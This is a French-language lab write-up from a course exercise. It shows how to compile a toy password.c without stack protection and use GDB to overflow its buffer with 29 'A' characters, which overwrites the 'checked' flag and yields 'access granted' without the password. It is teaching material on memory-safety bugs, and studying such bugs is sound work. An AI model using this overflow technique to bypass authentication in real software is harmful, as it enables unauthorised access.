# Exercice 3

### Consignes
- Téléchargez le fichier password.c depuis moodle
- Compilez-le avec la commande :
```bash
gcc -g -fno-stack-protector -o password password.c
```
- Essayez différentes tailles d’input afin d’obtenir l’output "access granted" sans introduire le bon mot de passe
- Utilisez GDB pour comprendre ce comportement

### Marche à suivre

- Compiler le fichier "password.c"
```bash
gcc -g -fno-stack-protector -o password password.c
```
- Ouvrir le fichier "password" avec GDB
```bash
gdb password
```
- Lancer le programme
```bash
run test
```
- Breakpoint check_password
```bash
break check_password
```
```bash
Breakpoint 1 at 0x555555555165: file password.c, line 5.
```
- Lancer le programme
```bash
run test
```
```bash	
Breakpoint 1, check_password (password=0x7fffffffe250 "test") at password.c:5
5           int checked = 0;
```
- Afficher les variables locales
```bash
info locals
```
```bash	
checked = 0
password_buffer = "cice 3/password"
```
- Afficher la valeur de &checked
```bash
print &checked
```
```bash
$1 = 0
```
- Afficher la valeur de &password_buffer
```bash
print password_buffer
```
```bash
$2 = "cice 3/password"
```
- Afficher la mémoire à l'adresse de &password_buffer
```bash
x/8xw password_buffer
```
```bash
0x7fffffffdd40: 0x65636963      0x702f3320      0x77737361      0x0064726f
0x7fffffffdd50: 0x00000000      0x00000000      0x00000000      0x00000000
```
- Lancer le programme avec un input de 29 caractères
```bash
run $(python -c 'print "A"*29')
```
- Afficher la mémoire à l'adresse de &password_buffer
```bash
x/8xw password_buffer
```
```bash
0x7fffffffdd30: 0x452f3120      0x63726578      0x20656369      0x61702f33
0x7fffffffdd40: 0x00000000      0x00000000      0x00000000      0x00000000
```
- Next
```bash
next
```
- Next
```bash
next
```
- Afficher la mémoire à l'adresse de &password_buffer
```bash
x/8xw password_buffer
```
```bash
0x7fffffffdd30: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdd40: 0x41414141      0x41414141      0x41414141      0x00000041
```
- Afficher la valeur de checked
```bash
print checked
```
```bash	
$3 = 65
```
- Continuer l'execution
```bash
continue
```

### Résultat
```bash
access granted
```